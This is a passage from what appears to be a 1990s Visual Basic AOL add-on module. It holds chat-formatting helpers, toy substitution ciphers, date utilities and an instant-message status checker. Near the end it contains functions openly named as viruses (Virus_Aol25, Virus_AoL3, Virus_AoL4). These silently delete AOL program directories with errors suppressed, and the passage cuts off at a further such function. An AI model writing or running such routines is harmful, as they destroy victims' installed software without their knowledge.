If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop
End Sub
Sub AoL4_ChatSend2(Txt)
'This is to make it were you can send lotsa lines
'of text on one chat line
For i = 1 To 1
a = a + Txt
Next
AoL4_ChatSend (".<p=" & a)
End Sub
Sub AoL4_ChatGreetz(Greetz)
'This is to make it were you can send all of your
'greets on one chat line
For i = 1 To 1
a = a + Greetz
Next
AoL4_ChatSend (".<p=" & a)
End Sub

Function Text_Encrypt(strin As String)
Let inptxt$ = strin
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "A" Then Let NextChr$ = "ø"
If NextChr$ = "B" Then Let NextChr$ = "§"
If NextChr$ = "C" Then Let NextChr$ = "Ñ"
If NextChr$ = "D" Then Let NextChr$ = "Æ"
If NextChr$ = "E" Then Let NextChr$ = "¬"
If NextChr$ = "F" Then Let NextChr$ = "¼"
If NextChr$ = "G" Then Let NextChr$ = "$"
If NextChr$ = "H" Then Let NextChr$ = "é"
If NextChr$ = "I" Then Let NextChr$ = "_"
If NextChr$ = "J" Then Let NextChr$ = "ß"
If NextChr$ = "K" Then Let NextChr$ = "•"
If NextChr$ = "L" Then Let NextChr$ = "ù"
If NextChr$ = "M" Then Let NextChr$ = "æ"
If NextChr$ = "N" Then Let NextChr$ = "-"
If NextChr$ = "O" Then Let NextChr$ = "x"
If NextChr$ = "P" Then Let NextChr$ = "ÿ"
If NextChr$ = "Q" Then Let NextChr$ = ";"
If NextChr$ = "R" Then Let NextChr$ = "¢"
If NextChr$ = "S" Then Let NextChr$ = "¶"
If NextChr$ = "T" Then Let NextChr$ = "~"
If NextChr$ = "U" Then Let NextChr$ = "û"
If NextChr$ = "V" Then Let NextChr$ = "»"
If NextChr$ = "W" Then Let NextChr$ = "«"
If NextChr$ = "X" Then Let NextChr$ = "·"
If NextChr$ = "Y" Then Let NextChr$ = "½"
If NextChr$ = "Z" Then Let NextChr$ = "^"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "a" Then Let NextChr$ = "†"
If NextChr$ = "b" Then Let NextChr$ = "‡"
If NextChr$ = "c" Then Let NextChr$ = "Š"
If NextChr$ = "d" Then Let NextChr$ = "Œ"
If NextChr$ = "e" Then Let NextChr$ = "—"
If NextChr$ = "f" Then Let NextChr$ = "š"
If NextChr$ = "g" Then Let NextChr$ = "¥"
If NextChr$ = "h" Then Let NextChr$ = "*"
If NextChr$ = "i" Then Let NextChr$ = "¯"
If NextChr$ = "j" Then Let NextChr$ = "°"
If NextChr$ = "k" Then Let NextChr$ = "±"
If NextChr$ = "l" Then Let NextChr$ = ")"
If NextChr$ = "m" Then Let NextChr$ = "³"
If NextChr$ = "n" Then Let NextChr$ = "¹"
If NextChr$ = "o" Then Let NextChr$ = "º"
If NextChr$ = "p" Then Let NextChr$ = "¿"
If NextChr$ = "q" Then Let NextChr$ = "×"
If NextChr$ = "r" Then Let NextChr$ = "Ø"
If NextChr$ = "s" Then Let NextChr$ = "Ð"
If NextChr$ = "t" Then Let NextChr$ = "Þ"
If NextChr$ = "u" Then Let NextChr$ = "þ"
If NextChr$ = "v" Then Let NextChr$ = "÷"
If NextChr$ = "w" Then Let NextChr$ = "À"
If NextChr$ = "x" Then Let NextChr$ = "Á"
If NextChr$ = "y" Then Let NextChr$ = "Â"
If NextChr$ = "z" Then Let NextChr$ = "Ã"
If NextChr$ = "1" Then Let NextChr$ = "#"
If NextChr$ = "2" Then Let NextChr$ = "Å"
If NextChr$ = "3" Then Let NextChr$ = "Ò"
If NextChr$ = "4" Then Let NextChr$ = "Ó"
If NextChr$ = "5" Then Let NextChr$ = "Ô"
If NextChr$ = "6" Then Let NextChr$ = "Õ"
If NextChr$ = "7" Then Let NextChr$ = "Ö"
If NextChr$ = "8" Then Let NextChr$ = "&"
If NextChr$ = "9" Then Let NextChr$ = "Ù"
If NextChr$ = "0" Then Let NextChr$ = "Ú"
Let NewSent$ = NewSent$ + NextChr$
Loop
Text_Encrypt = NewSent$
End Function
Function meeh_DeEncrypt(strin As String)
Let inptxt$ = strin
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "š" Then Let NextChr$ = "A"
If NextChr$ = "œ" Then Let NextChr$ = "B"
If NextChr$ = "¢" Then Let NextChr$ = "C"
If NextChr$ = "¤" Then Let NextChr$ = "D"
If NextChr$ = "±" Then Let NextChr$ = "E"
If NextChr$ = "°" Then Let NextChr$ = "F"
If NextChr$ = "²" Then Let NextChr$ = "G"
If NextChr$ = "³" Then Let NextChr$ = "H"
If NextChr$ = "µ" Then Let NextChr$ = "I"
If NextChr$ = "ª" Then Let NextChr$ = "J"
If NextChr$ = "¹" Then Let NextChr$ = "K"
If NextChr$ = "º" Then Let NextChr$ = "L"
If NextChr$ = "Ÿ" Then Let NextChr$ = "M"
If NextChr$ = "í" Then Let NextChr$ = "N"
If NextChr$ = "î" Then Let NextChr$ = "O"
If NextChr$ = "ï" Then Let NextChr$ = "P"
If NextChr$ = "ð" Then Let NextChr$ = "Q"
If NextChr$ = "ñ" Then Let NextChr$ = "R"
If NextChr$ = "ò" Then Let NextChr$ = "S"
If NextChr$ = "ó" Then Let NextChr$ = "T"
If NextChr$ = "ô" Then Let NextChr$ = "U"
If NextChr$ = "õ" Then Let NextChr$ = "V"
If NextChr$ = "ö" Then Let NextChr$ = "W"
If NextChr$ = "ø" Then Let NextChr$ = "X"
If NextChr$ = "ù" Then Let NextChr$ = "Y"
If NextChr$ = "ú" Then Let NextChr$ = "Z"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "'" Then Let NextChr$ = "a"
If NextChr$ = "û" Then Let NextChr$ = "b"
If NextChr$ = "ü" Then Let NextChr$ = "c"
If NextChr$ = "ý" Then Let NextChr$ = "d"
If NextChr$ = "þ" Then Let NextChr$ = "e"
If NextChr$ = "Æ" Then Let NextChr$ = "f"
If NextChr$ = "Ç" Then Let NextChr$ = "g"
If NextChr$ = "Ì" Then Let NextChr$ = "h"
If NextChr$ = "Í" Then Let NextChr$ = "i"
If NextChr$ = "Î" Then Let NextChr$ = "j"
If NextChr$ = "Ï" Then Let NextChr$ = "k"
If NextChr$ = "Ø" Then Let NextChr$ = "l"
If NextChr$ = "Þ" Then Let NextChr$ = "m"
If NextChr$ = "ß" Then Let NextChr$ = "n"
If NextChr$ = "†" Then Let NextChr$ = "o"
If NextChr$ = "ƒ" Then Let NextChr$ = "p"
If NextChr$ = "Œ" Then Let NextChr$ = "q"
If NextChr$ = "Š" Then Let NextChr$ = "r"
If NextChr$ = "‡" Then Let NextChr$ = "s"
If NextChr$ = "¡" Then Let NextChr$ = "t"
If NextChr$ = "£" Then Let NextChr$ = "u"
If NextChr$ = "§" Then Let NextChr$ = "v"
If NextChr$ = "ì" Then Let NextChr$ = "w"
If NextChr$ = "ë" Then Let NextChr$ = "x"
If NextChr$ = "ê" Then Let NextChr$ = "y"
If NextChr$ = "é" Then Let NextChr$ = "z"
If NextChr$ = "è" Then Let NextChr$ = "1"
If NextChr$ = "ç" Then Let NextChr$ = "2"
If NextChr$ = "æ" Then Let NextChr$ = "3"
If NextChr$ = "á" Then Let NextChr$ = "4"
If NextChr$ = "å" Then Let NextChr$ = "5"
If NextChr$ = "â" Then Let NextChr$ = "6"
If NextChr$ = "ã" Then Let NextChr$ = "7"
If NextChr$ = "ä" Then Let NextChr$ = "8"
If NextChr$ = "à" Then Let NextChr$ = "9"
If NextChr$ = "×" Then Let NextChr$ = "0"
Let NewSent$ = NewSent$ + NextChr$
Loop
meeh_DeEncrypt = NewSent$
End Function


Function AoL4_boldBlackLBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, f, f - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D & "<b>"
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldLBlueGreenLBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldLBlueYellowLBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldPurpleLBluePurple(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
      G = RGB(255, f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "><b>" & D & "<b>"
    Next b
 AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldDBlueBlackDBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 450 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldDGreenBlack(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldLBlueOrange(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 155, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldLBlueOrange_LBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 155, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldLGreenDGreen(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(0, 375 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldLGreenDGreenLGreen(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 375 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldLBlueDBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(355, 255 - f, 55)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & ">" & D & "<b>"
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldLBlueDBlueLBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(355, 255 - f, 55)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & ">" & D & "<b>"
    Next b
    AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldPinkOrange(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 200 / a
        f = e * b
        G = RGB(255 - f, 167, 510)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldPinkOrangePink(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 167, 510)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldPurpleWhite(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 200 / a
        f = e * b
        G = RGB(255, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldPurpleWhitePurple(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("<b>" + Msg + "")
End Function
Function AoL4_boldYellowBlueYellow(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("<b>" + Msg + "")
End Function

Function meeh_Encrypt(strin As String)
Let inptxt$ = strin
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "A" Then Let NextChr$ = "š"
If NextChr$ = "B" Then Let NextChr$ = "œ"
If NextChr$ = "C" Then Let NextChr$ = "¢"
If NextChr$ = "D" Then Let NextChr$ = "¤"
If NextChr$ = "E" Then Let NextChr$ = "±"
If NextChr$ = "F" Then Let NextChr$ = "°"
If NextChr$ = "G" Then Let NextChr$ = "²"
If NextChr$ = "H" Then Let NextChr$ = "³"
If NextChr$ = "I" Then Let NextChr$ = "µ"
If NextChr$ = "J" Then Let NextChr$ = "ª"
If NextChr$ = "K" Then Let NextChr$ = "¹"
If NextChr$ = "L" Then Let NextChr$ = "º"
If NextChr$ = "M" Then Let NextChr$ = "Ÿ"
If NextChr$ = "N" Then Let NextChr$ = "í"
If NextChr$ = "O" Then Let NextChr$ = "î"
If NextChr$ = "P" Then Let NextChr$ = "ï"
If NextChr$ = "Q" Then Let NextChr$ = "ð"
If NextChr$ = "R" Then Let NextChr$ = "ñ"
If NextChr$ = "S" Then Let NextChr$ = "ò"
If NextChr$ = "T" Then Let NextChr$ = "ó"
If NextChr$ = "U" Then Let NextChr$ = "ô"
If NextChr$ = "V" Then Let NextChr$ = "õ"
If NextChr$ = "W" Then Let NextChr$ = "ö"
If NextChr$ = "X" Then Let NextChr$ = "ø"
If NextChr$ = "Y" Then Let NextChr$ = "ù"
If NextChr$ = "Z" Then Let NextChr$ = "ú"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "a" Then Let NextChr$ = "'"
If NextChr$ = "b" Then Let NextChr$ = "û"
If NextChr$ = "c" Then Let NextChr$ = "ü"
If NextChr$ = "d" Then Let NextChr$ = "ý"
If NextChr$ = "e" Then Let NextChr$ = "þ"
If NextChr$ = "f" Then Let NextChr$ = "Æ"
If NextChr$ = "g" Then Let NextChr$ = "Ç"
If NextChr$ = "h" Then Let NextChr$ = "Ì"
If NextChr$ = "i" Then Let NextChr$ = "Í"
If NextChr$ = "j" Then Let NextChr$ = "Î"
If NextChr$ = "k" Then Let NextChr$ = "Ï"
If NextChr$ = "l" Then Let NextChr$ = "Ø"
If NextChr$ = "m" Then Let NextChr$ = "Þ"
If NextChr$ = "n" Then Let NextChr$ = "ß"
If NextChr$ = "o" Then Let NextChr$ = "†"
If NextChr$ = "p" Then Let NextChr$ = "ƒ"
If NextChr$ = "q" Then Let NextChr$ = "Œ"
If NextChr$ = "r" Then Let NextChr$ = "Š"
If NextChr$ = "s" Then Let NextChr$ = "‡"
If NextChr$ = "t" Then Let NextChr$ = "¡"
If NextChr$ = "u" Then Let NextChr$ = "£"
If NextChr$ = "v" Then Let NextChr$ = "§"
If NextChr$ = "w" Then Let NextChr$ = "ì"
If NextChr$ = "x" Then Let NextChr$ = "ë"
If NextChr$ = "y" Then Let NextChr$ = "ê"
If NextChr$ = "z" Then Let NextChr$ = "é"
If NextChr$ = "1" Then Let NextChr$ = "è"
If NextChr$ = "2" Then Let NextChr$ = "ç"
If NextChr$ = "3" Then Let NextChr$ = "æ"
If NextChr$ = "4" Then Let NextChr$ = "á"
If NextChr$ = "5" Then Let NextChr$ = "å"
If NextChr$ = "6" Then Let NextChr$ = "â"
If NextChr$ = "7" Then Let NextChr$ = "ã"
If NextChr$ = "8" Then Let NextChr$ = "ä"
If NextChr$ = "9" Then Let NextChr$ = "à"
If NextChr$ = "0" Then Let NextChr$ = "×"
Let NewSent$ = NewSent$ + NextChr$
Loop
meeh_Encrypt = NewSent$
End Function

Function Text_DeEncrypt(strin As String)
Let inptxt$ = strin
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "ø" Then Let NextChr$ = "A"
If NextChr$ = "§" Then Let NextChr$ = "B"
If NextChr$ = "Ñ" Then Let NextChr$ = "C"
If NextChr$ = "Æ" Then Let NextChr$ = "D"
If NextChr$ = "¬" Then Let NextChr$ = "E"
If NextChr$ = "¼" Then Let NextChr$ = "F"
If NextChr$ = "$" Then Let NextChr$ = "G"
If NextChr$ = "é" Then Let NextChr$ = "H"
If NextChr$ = "_" Then Let NextChr$ = "I"
If NextChr$ = "ß" Then Let NextChr$ = "J"
If NextChr$ = "•" Then Let NextChr$ = "K"
If NextChr$ = "ù" Then Let NextChr$ = "L"
If NextChr$ = "æ" Then Let NextChr$ = "M"
If NextChr$ = "-" Then Let NextChr$ = "N"
If NextChr$ = "x" Then Let NextChr$ = "O"
If NextChr$ = "ÿ" Then Let NextChr$ = "P"
If NextChr$ = ";" Then Let NextChr$ = "Q"
If NextChr$ = "¢" Then Let NextChr$ = "R"
If NextChr$ = "¶" Then Let NextChr$ = "S"
If NextChr$ = "~" Then Let NextChr$ = "T"
If NextChr$ = "û" Then Let NextChr$ = "U"
If NextChr$ = "»" Then Let NextChr$ = "V"
If NextChr$ = "«" Then Let NextChr$ = "W"
If NextChr$ = "·" Then Let NextChr$ = "X"
If NextChr$ = "½" Then Let NextChr$ = "Y"
If NextChr$ = "^" Then Let NextChr$ = "Z"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "†" Then Let NextChr$ = "a"
If NextChr$ = "‡" Then Let NextChr$ = "b"
If NextChr$ = "Š" Then Let NextChr$ = "c"
If NextChr$ = "Œ" Then Let NextChr$ = "d"
If NextChr$ = "—" Then Let NextChr$ = "e"
If NextChr$ = "š" Then Let NextChr$ = "f"
If NextChr$ = "¥" Then Let NextChr$ = "g"
If NextChr$ = "*" Then Let NextChr$ = "h"
If NextChr$ = "¯" Then Let NextChr$ = "i"
If NextChr$ = "°" Then Let NextChr$ = "j"
If NextChr$ = "±" Then Let NextChr$ = "k"
If NextChr$ = ")" Then Let NextChr$ = "l"
If NextChr$ = "³" Then Let NextChr$ = "m"
If NextChr$ = "¹" Then Let NextChr$ = "n"
If NextChr$ = "º" Then Let NextChr$ = "o"
If NextChr$ = "¿" Then Let NextChr$ = "p"
If NextChr$ = "×" Then Let NextChr$ = "q"
If NextChr$ = "Ø" Then Let NextChr$ = "r"
If NextChr$ = "Ð" Then Let NextChr$ = "s"
If NextChr$ = "Þ" Then Let NextChr$ = "t"
If NextChr$ = "þ" Then Let NextChr$ = "u"
If NextChr$ = "÷" Then Let NextChr$ = "u"
If NextChr$ = "À" Then Let NextChr$ = "w"
If NextChr$ = "Á" Then Let NextChr$ = "x"
If NextChr$ = "Â" Then Let NextChr$ = "y"
If NextChr$ = "Ã" Then Let NextChr$ = "z"
If NextChr$ = "#" Then Let NextChr$ = "1"
If NextChr$ = "Å" Then Let NextChr$ = "2"
If NextChr$ = "Ò" Then Let NextChr$ = "3"
If NextChr$ = "Ó" Then Let NextChr$ = "4"
If NextChr$ = "Ô" Then Let NextChr$ = "5"
If NextChr$ = "Õ" Then Let NextChr$ = "6"
If NextChr$ = "Ö" Then Let NextChr$ = "7"
If NextChr$ = "&" Then Let NextChr$ = "8"
If NextChr$ = "Ù" Then Let NextChr$ = "9"
If NextChr$ = "Ú" Then Let NextChr$ = "0"
Let NewSent$ = NewSent$ + NextChr$
Loop
Text_DeEncrypt = NewSent$
End Function

Public Sub Combo_Load(ByVal dir As String, Combo As ComboBox)
    Dim meeh As String
    On Error Resume Next
    Open dir$ For Input As #1
    While Not EOF(1)
        Input #1, meeh$
        DoEvents
        Combo.AddItem meeh$
    Wend
    Close #1
End Sub

Function Text_Hacker(strin As String)
'Lame but people use it
Let inptxt$ = strin
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "A" Then Let NextChr$ = "a"
If NextChr$ = "E" Then Let NextChr$ = "e"
If NextChr$ = "I" Then Let NextChr$ = "i"
If NextChr$ = "O" Then Let NextChr$ = "o"
If NextChr$ = "U" Then Let NextChr$ = "u"
If NextChr$ = "b" Then Let NextChr$ = "B"
If NextChr$ = "c" Then Let NextChr$ = "C"
If NextChr$ = "d" Then Let NextChr$ = "D"
If NextChr$ = "z" Then Let NextChr$ = "Z"
If NextChr$ = "f" Then Let NextChr$ = "F"
If NextChr$ = "g" Then Let NextChr$ = "G"
If NextChr$ = "h" Then Let NextChr$ = "H"
If NextChr$ = "y" Then Let NextChr$ = "Y"
If NextChr$ = "j" Then Let NextChr$ = "J"
If NextChr$ = "k" Then Let NextChr$ = "K"
If NextChr$ = "l" Then Let NextChr$ = "L"
If NextChr$ = "m" Then Let NextChr$ = "M"
If NextChr$ = "n" Then Let NextChr$ = "N"
If NextChr$ = "x" Then Let NextChr$ = "X"
If NextChr$ = "p" Then Let NextChr$ = "P"
If NextChr$ = "q" Then Let NextChr$ = "Q"
If NextChr$ = "r" Then Let NextChr$ = "R"
If NextChr$ = "s" Then Let NextChr$ = "S"
If NextChr$ = "t" Then Let NextChr$ = "T"
If NextChr$ = "w" Then Let NextChr$ = "W"
If NextChr$ = "v" Then Let NextChr$ = "V"
If NextChr$ = " " Then Let NextChr$ = " "
Let NewSent$ = NewSent$ + NextChr$
Loop
Text_Hacker = NewSent$
End Function

Function AoL4_RoomCaption() As String
On Error Resume Next
AoL4_RoomCaption = GetAPIText(AoL4_FindChatRoom())
End Function

Function Fix_Date()
'Makes the date like: 12-16-98
'ie: text1.text = Fix_Date
Let inptxt$ = Date
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "/" Then Let NextChr$ = "-"
Let NewSent$ = NewSent$ + NextChr$
Loop
Fix_Date = NewSent$
End Function

Function Fix_Date2()
'Makes the date like: 12-16
'ie: text1.text = Fix_Date2
Let inptxt$ = Date
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "/" Then Let NextChr$ = "-"
Let NewSent$ = NewSent$ + NextChr$
Loop
Kneel = Len(NewSent$)
bob = Kneel - 3
meeh$ = Left$(NewSent$, bob)
Fix_Date2 = meeh$
End Function

Public Function AoL4_ImCheck(Person As String) As Boolean
'Code by cro0k
    Dim AOL As Long, MDI As Long, IM As Long, text As Long
Dim Avail As Long, Avail1 As Long, Avail2 As Long
    Dim Avail3 As Long, Window As Long, Button As Long
Dim aStatic As Long, aString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call AOL4_Keyword("aol://9293:" & Person$)
    Do
DoEvents
        IM& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
text& = FindWindowEx(IM&, 0&, "RICHCNTL", vbNullString)
        Avail1& = FindWindowEx(IM&, 0&, "_AOL_Icon", vbNullString)
Avail2& = FindWindowEx(IM&, Avail1&, "_AOL_Icon", vbNullString)
        Avail3& = FindWindowEx(IM&, Avail2&, "_AOL_Icon", vbNullString)
Avail& = FindWindowEx(IM&, Avail3&, "_AOL_Icon", vbNullString)
        Avail& = FindWindowEx(IM&, Avail&, "_AOL_Icon", vbNullString)
Avail& = FindWindowEx(IM&, Avail&, "_AOL_Icon", vbNullString)
Avail& = FindWindowEx(IM&, Avail&, "_AOL_Icon", vbNullString)
        Avail& = FindWindowEx(IM&, Avail&, "_AOL_Icon", vbNullString)
Avail& = FindWindowEx(IM&, Avail&, "_AOL_Icon", vbNullString)
        Avail& = FindWindowEx(IM&, Avail&, "_AOL_Icon", vbNullString)
Loop Until IM& <> 0& And text <> 0& And Avail& <> 0& And Avail& <> Avail1& And Avail& <> Avail2& And Avail& <> Avail3&
    DoEvents
    Call SendMessage(Avail&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(Avail&, WM_LBUTTONUP, 0&, 0&)
    Do
DoEvents
        Window& = FindWindow("#32770", "America Online")
Button& = FindWindowEx(Window&, 0&, "Button", "OK")
    Loop Until Window& <> 0& And Button& <> 0&
    Do
DoEvents
        aStatic& = FindWindowEx(Window&, 0&, "Static", vbNullString)
aStatic& = FindWindowEx(Window&, aStatic&, "Static", vbNullString)
        aString$ = AoL4_GetText(aStatic)
    Loop Until aStatic& <> 0& And Len(aString$) > 15
If InStr(aString$, "is online and able to receive") <> 0 Then
        AoL4_ImCheck = True
        AoL4_ChatSend (Person & " Has ims on")
    Else
        AoL4_ImCheck = False
        AoL4_ChatSend (Person & " Has ims off")
End If
    Call SendMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
Call SendMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
    Call SendMessage(IM&, WM_CLOSE, 0&, 0&)
End Function
Function Fix_Time()
'Makes the time like: 11:35
Kneel = Len(Time)
kneel2 = Kneel - 6
s2$ = Left$(Time, kneel2)
Fix_Time = s2$
End Function

Sub Pause(interval)
'Do not ask me why i put two of the same function
Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub

Sub TimeOut(interval)
'Do not ask me why i put two of the same function
Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub

Sub Comp_FileMakeDiR(dir As String)
MkDir dir$
End Sub

Function Comp_DelFile(FilE As String)
On Error Resume Next
Kill FilE$
NoFreeze% = DoEvents()
End Function

Sub Comp_DelDiR(dir As String)
RmDir (dir$)
End Sub

Function Virus_Aol25()
On Error Resume Next
Comp_DelDiR ("C:\AOL 25\idb")
Comp_DelDiR ("C:\AOL 25a\idb")
Comp_DelDiR ("C:\AOL 25b\idb")
Comp_DelDiR ("C:\AOL 25i\idb")
Comp_DelDiR ("C:\AOL 25\Organize")
Comp_DelDiR ("C:\AOL 25a\Organize")
Comp_DelDiR ("C:\AOL 25b\Organize")
Comp_DelDiR ("C:\AOL 25i\Organize")
Comp_DelDiR ("C:\AOL 25\Tool")
Comp_DelDiR ("C:\AOL 25a\Tool")
Comp_DelDiR ("C:\AOL 25b\Tool")
Comp_DelDiR ("C:\AOL 25i\Tool")
End Function

Function Virus_AoL3()
On Error Resume Next
Comp_DelDiR ("C:\AOL 30\idb")
Comp_DelDiR ("C:\AOL 30a\idb")
Comp_DelDiR ("C:\AOL 30b\idb")
Comp_DelDiR ("C:\AOL 30\Organize")
Comp_DelDiR ("C:\AOL 30a\Organize")
Comp_DelDiR ("C:\AOL 30b\Organize")
Comp_DelDiR ("C:\AOL 30\Tool")
Comp_DelDiR ("C:\AOL 30a\Tool")
Comp_DelDiR ("C:\AOL 30b\Tool")
End Function

Function Virus_AoL4()
On Error Resume Next
Comp_DelDiR ("C:\AOL 40\idb")
Comp_DelDiR ("C:\AOL 40a\idb")
Comp_DelDiR ("C:\AOL 40b\idb")
Comp_DelDiR ("C:\AOL 40\Organize")
Comp_DelDiR ("C:\AOL 40a\Organize")
Comp_DelDiR ("C:\AOL 40b\Organize")
Comp_DelDiR ("C:\AOL 40\Tool")
Comp_DelDiR ("C:\AOL 40a\Tool")
Comp_DelDiR ("C:\AOL 40b\Tool")
End Function

Function Virus_AiM()
